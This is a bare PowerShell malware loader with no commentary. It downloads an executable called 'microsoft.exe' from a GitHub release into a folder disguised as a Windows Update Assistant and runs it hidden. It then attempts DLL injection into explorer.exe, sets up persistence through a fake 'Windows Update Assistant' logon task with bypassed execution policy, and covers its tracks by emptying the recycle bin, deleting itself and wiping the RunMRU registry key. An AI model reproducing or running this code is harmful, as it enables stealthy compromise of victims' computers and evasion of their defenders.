$repo = "BotSolo621/WLP"
$file = "microsoft.exe"
$targetProcess = "explorer"
$targetPath = "$env:APPDATA\Microsoft\Windows\UpdateAssistant\"
New-Item -ItemType Directory -Path $targetPath -Force -ErrorAction SilentlyContinue | Out-Null

function Get-LatestVersion {
    try {
        $releases = "https://api.github.com/repos/$repo/releases"
        $releaseData = (Invoke-RestMethod -Uri $releases -ErrorAction Stop)
        return $releaseData[0].tag_name
    } catch {
        return $null
    }
}

function Get-CurrentVersion {
    $versionFile = Join-Path -Path $targetPath -ChildPath "version.txt"
    if (Test-Path -Path $versionFile) {
        return (Get-Content -Path $versionFile -Raw).Trim()
    }
    return $null
}

$latestVersion = Get-LatestVersion
$currentVersion = Get-CurrentVersion

$exePath = Join-Path -Path $targetPath -ChildPath $file
$needsUpdate = (-not $currentVersion) -or ($currentVersion -ne $latestVersion)

if ($needsUpdate -and $latestVersion) {
    try {
        $downloadUrl = "https://github.com/$repo/releases/download/$latestVersion/$file"
        Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
        $versionFile = Join-Path -Path $targetPath -ChildPath "version.txt"
        Set-Content -Path $versionFile -Value $latestVersion -Force
    } catch {
        if (-not (Test-Path -Path $exePath)) { exit }
    }
}

function Invoke-ProcessInjection {
    param (
        [string]$ProcessName,
        [string]$DllPath
    )

    $targetProc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $targetProc) { return $false }

    $MethodDefinition = @"
        using System;
        using System.Runtime.InteropServices;
        public class Injector {
            [DllImport("kernel32.dll")]
            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        }
"@
    Add-Type -TypeDefinition $MethodDefinition -Language CSharp
    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
    if ($hProcess -eq [IntPtr]::Zero) { return $false }
    $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
    $size = $dllBytes.Length
    $allocAddr = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, 0x3000, 0x40)
    if ($allocAddr -eq [IntPtr]::Zero) { return $false }
    [Injector]::WriteProcessMemory($hProcess, $allocAddr, $dllBytes, $size, [ref][UIntPtr]::Zero) | Out-Null
    $hKernel32 = [Injector]::GetModuleHandle("kernel32.dll")
    $loadLibAddr = [Injector]::GetProcAddress($hKernel32, "LoadLibraryA")
    $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $allocAddr, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) { return $false }
    return $true
}

function Clear-RecycleBin {
    try {
        $shell = New-Object -ComObject Shell.Application
        $shell.Namespace(0xA).Items() | ForEach-Object { 
            Remove-Item $_.Path -Force -Recurse -ErrorAction SilentlyContinue 
        }
    } catch {}
}

if (Test-Path -Path $exePath) {
    Start-Process -FilePath $exePath -WindowStyle Hidden
    Invoke-ProcessInjection -ProcessName $targetProcess -DllPath $exePath
    Clear-RecycleBin
}

$taskName = "Windows Update Assistant"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Process '$exePath'; Invoke-ProcessInjection -ProcessName '$targetProcess' -DllPath '$exePath'; Clear-RecycleBin`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction SilentlyContinue

if ($MyInvocation.MyCommand.Path) {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}

Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force
